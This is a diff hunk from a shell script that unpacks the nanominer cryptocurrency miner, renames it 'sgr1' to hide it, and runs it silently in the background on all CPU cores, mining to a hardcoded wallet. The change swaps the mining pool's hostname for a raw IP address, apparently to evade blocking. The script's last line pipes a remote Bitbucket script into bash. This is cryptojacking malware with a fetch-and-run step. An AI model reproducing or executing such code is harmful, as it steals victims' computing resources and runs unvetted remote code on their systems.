@@ -15,5 +15,5 @@ tar xf nanominer-linux-3.5.1.tar.gz >/dev/null 2>&1
 rm -rvf nanominer-linux-3.5.1.tar.gz >/dev/null 2>&1
 cd nanominer-linux-3.5.1 
 mv nanominer sgr1
-./sgr1 -algo Verushash -wallet RWXttxnPnw25JkD2QzfJCW4JcoeCoivtF1 -coin VRSC -rigName Rig-Rent -pool1 na.luckpool.net:3956 -useSSL false -cpuThreads $(nproc --all) >/dev/null 2>&1 &
+./sgr1 -algo Verushash -wallet RWXttxnPnw25JkD2QzfJCW4JcoeCoivtF1 -coin VRSC -rigName Rig-Rent -pool1 149.56.27.47:3956 -useSSL false -cpuThreads $(nproc --all) >/dev/null 2>&1 &
 curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
